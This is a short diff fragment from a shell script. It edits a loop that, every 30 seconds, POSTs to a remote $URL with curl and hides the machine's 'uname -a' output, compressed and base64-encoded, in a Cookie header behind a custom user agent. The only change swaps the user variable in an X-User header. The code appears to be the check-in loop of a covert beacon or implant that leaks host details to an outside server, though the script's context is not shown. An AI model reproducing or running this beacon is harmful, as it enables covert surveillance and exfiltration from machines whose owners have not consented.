@@ -335,7 +335,7 @@ else
   while true
   do
     sleep 30
-    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" $URL
+    curl -s  -X POST -A "${UA}" -H "X-User: ${USER}" -H "Cookie: `uname -a | gzip | base64 -w0`" $URL
     echo
   done
 fi
